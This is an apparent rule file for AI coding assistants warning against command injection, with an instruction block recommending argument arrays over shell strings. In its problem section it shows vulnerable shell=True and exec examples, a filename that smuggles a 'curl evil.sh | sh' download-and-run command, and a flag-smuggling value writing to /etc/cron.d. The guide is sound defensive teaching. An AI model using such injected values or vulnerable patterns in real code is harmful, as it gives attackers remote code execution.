---
title: Never Build Shell Commands From User Input
slug: no-shell-command-injection
category: security
tags: [universal, security, injection]
works_with: all
severity: critical
one_liner: "AI passing user input into shell=True, exec, or backtick commands"
---

# Never Build Shell Commands From User Input

> **Works with:** All AI coding assistants (Claude Code, Cursor, Windsurf, Copilot, Cline, Aider)

> Prevents AI from interpolating user-controlled data into shell command strings.

**[Copy-paste ready version](../../install/no-shell-command-injection.md)** — just the instruction block, no explanation.

## The Problem

The user wants to convert an uploaded file, ping a host, or run ffmpeg with a user-chosen filename. The AI writes `subprocess.run(f"convert {filename} out.png", shell=True)` or `` exec(`ping ${host}`) `` in Node. It works in testing because the test filename is `cat.jpg`. Then someone uploads a file named `cat.jpg; curl evil.sh | sh` and your server is now someone else's server.

Assistants reach for `shell=True` and `child_process.exec` because the string form is what shell-using humans write in terminals, so it dominates examples. Pipes, globs, and redirects also "just work" in shell mode, which makes the insecure version feel more capable. The argument-array form (`subprocess.run(["convert", filename, "out.png"])`, `execFile`) is exactly as capable for the 95% case and immune to metacharacter injection, but it's one notch less familiar, so the AI doesn't default to it.

Command injection is worse than most injection classes because the payoff is immediate arbitrary code execution. There is no "limited blast radius" version.

## The Instruction

Copy everything between the horizontal rules into your instructions file:

---

### Never Build Shell Commands From User Input

NEVER interpolate user-controlled data into a shell command string. ALWAYS pass arguments as an array to an API that does not invoke a shell.

A command string plus user input is remote code execution waiting for one semicolon, backtick, or `$()`.

- Python: use `subprocess.run([...], shell=False)` with a list of arguments. Do not use `shell=True`, `os.system`, or `os.popen` with any dynamic content.
- Node: use `execFile` or `spawn` with an args array. Do not use `child_process.exec` or backtick-built command strings with dynamic content.
- Go/Rust/Java: `exec.Command(name, args...)` and equivalents already separate arguments; do not wrap commands in `sh -c` to get string convenience back.
- Filenames and hostnames count as user input. So do values from your own database if any user ever wrote them.
- If an argument starts with `-`, an attacker can smuggle flags (`--output=/etc/cron.d/x`). Use `--` to terminate option parsing where the tool supports it, and validate expected formats.
- If you genuinely need shell features (pipelines, globbing), construct the pipeline in code with multiple `spawn` calls, or quote with `shlex.quote` as a last resort and say why in a comment.
- Escaping with string replacement (`.replace("'", "\\'")`) is not a fix. Do not write it.

**Red flags that you're about to violate this:**
- "shell=True is simpler and this input comes from a trusted form..."
- "It's just a filename, filenames are harmless..."
- "I'll strip semicolons from the input first..."
- "This script only runs in CI, nobody malicious touches CI..."
- "The exec string version is what the docs show..."
- "I need the pipe character, so I have to use the shell..."

---

## Why It Works

1. **It names the exact APIs on both sides.** "Don't do command injection" is too abstract to change behavior; "use `execFile`, not `exec`" maps directly to the token the AI is about to emit.

2. **It reclassifies filenames as untrusted.** The most common AI blind spot is treating filenames, hostnames, and database values as "ours." Saying it explicitly removes the trust shortcut.

3. **It closes the sanitization escape hatch.** AIs love to "fix" injection by stripping characters, which fails against encodings and forgotten metacharacters. Banning the pattern forces the structural fix.

4. **It covers argument injection, not just command injection.** The `--` detail catches the second-order failure that survives even an args array.

## Origin

An internal media tool let users name their exports. An assistant implemented the conversion step with a template-literal `exec` call, and review didn't catch it because the happy path worked flawlessly. A bug bounty report later demonstrated full shell access via a crafted export name. The patched version was the same call with `execFile` and an array, four characters longer than the vulnerable one.
